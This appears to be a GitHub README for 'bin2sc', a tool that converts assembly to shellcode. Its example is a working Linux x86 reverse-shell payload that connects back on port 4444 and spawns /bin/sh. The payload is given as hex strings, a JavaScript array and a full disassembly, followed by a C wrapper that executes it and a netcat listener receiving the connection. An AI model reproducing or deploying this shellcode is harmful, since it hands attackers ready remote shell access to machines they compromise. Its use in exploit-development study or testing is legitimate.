# bin2sc
Binary to shellcode

## Install
```
git clone https://github.com/SkyBulk/bin2sc.git
chmod +x bin2sc.py
python3 bin2sc.py 
```

## Example Usage:
```python;
python3 bin2sc.py shellcode.asm {sc_arr,sc_app} {linux,win} {x86,x64}
```

```asm
[+] block Shellcode
\x89\xe5\x31\xc0\x31\xc9\x31\xd2
\x50\x50\xb8\xff\xff\xff\xff\xbb
\x80\xff\xff\xfe\x31\xc3\x53\x66
\x68\x11\x5c\x66\x6a\x02\x31\xc0
\x31\xdb\x66\xb8\x67\x01\xb3\x02
\xb1\x01\xcd\x80\x89\xc3\x66\xb8
\x6a\x01\x89\xe1\x89\xea\x29\xe2
\xcd\x80\x31\xc9\xb1\x03\x31\xc0
\xb0\x3f\x49\xcd\x80\x41\xe2\xf6
\x31\xc0\x31\xd2\x50\x68\x2f\x2f
\x73\x68\x68\x2f\x62\x69\x6e\x89
\xe3\xb0\x0b\xcd\x80

[+] linear shellcode

\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\xff\xff\xff\xff\xbb\x80\xff\xff\xfe\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80

[+] linear shellcode for javascript

shellcode = [0x89, 0xe5, 0x31, 0xc0, 0x31, 0xc9, 0x31, 0xd2, 0x50, 0x50, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xbb, 0x80, 0xff, 0xff, 0xfe, 0x31, 0xc3, 0x53, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 0x02, 0x31, 0xc0, 0x31, 0xdb, 0x66, 0xb8, 0x67, 0x01, 0xb3, 0x02, 0xb1, 0x01, 0xcd, 0x80, 0x89, 0xc3, 0x66, 0xb8, 0x6a, 0x01, 0x89, 0xe1, 0x89, 0xea, 0x29, 0xe2, 0xcd, 0x80, 0x31, 0xc9, 0xb1, 0x03, 0x31, 0xc0, 0xb0, 0x3f, 0x49, 0xcd, 0x80, 0x41, 0xe2, 0xf6, 0x31, 0xc0, 0x31, 0xd2, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0xb0, 0x0b, 0xcd, 0x80]
```

### Double check shellcode opcodes 

```asm
shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	89 e5                	mov    ebp,esp
 8048062:	31 c0                	xor    eax,eax
 8048064:	31 c9                	xor    ecx,ecx
 8048066:	31 d2                	xor    edx,edx
 8048068:	50                   	push   eax
 8048069:	50                   	push   eax
 804806a:	b8 ff ff ff ff       	mov    eax,0xffffffff
 804806f:	bb 80 ff ff fe       	mov    ebx,0xfeffff80
 8048074:	31 c3                	xor    ebx,eax
 8048076:	53                   	push   ebx
 8048077:	66 68 11 5c          	pushw  0x5c11
 804807b:	66 6a 02             	pushw  0x2
 804807e:	31 c0                	xor    eax,eax
 8048080:	31 db                	xor    ebx,ebx
 8048082:	66 b8 67 01          	mov    ax,0x167
 8048086:	b3 02                	mov    bl,0x2
 8048088:	b1 01                	mov    cl,0x1
 804808a:	cd 80                	int    0x80
 804808c:	89 c3                	mov    ebx,eax
 804808e:	66 b8 6a 01          	mov    ax,0x16a
 8048092:	89 e1                	mov    ecx,esp
 8048094:	89 ea                	mov    edx,ebp
 8048096:	29 e2                	sub    edx,esp
 8048098:	cd 80                	int    0x80
 804809a:	31 c9                	xor    ecx,ecx
 804809c:	b1 03                	mov    cl,0x3

0804809e <dup>:
 804809e:	31 c0                	xor    eax,eax
 80480a0:	b0 3f                	mov    al,0x3f
 80480a2:	49                   	dec    ecx
 80480a3:	cd 80                	int    0x80
 80480a5:	41                   	inc    ecx
 80480a6:	e2 f6                	loop   804809e <dup>
 80480a8:	31 c0                	xor    eax,eax
 80480aa:	31 d2                	xor    edx,edx
 80480ac:	50                   	push   eax
 80480ad:	68 2f 2f 73 68       	push   0x68732f2f
 80480b2:	68 2f 62 69 6e       	push   0x6e69622f
 80480b7:	89 e3                	mov    ebx,esp
 80480b9:	b0 0b                	mov    al,0xb
 80480bb:	cd 80                	int    0x80
```

## shellcode testing 
```
blackleitus@blackleitus:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

## Wrapper shellcode

```c
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\xff\xff\xff\xff\xbb\x80\xff\xff\xfe\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(void) {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

`Connection from localhost 49058 received!` 
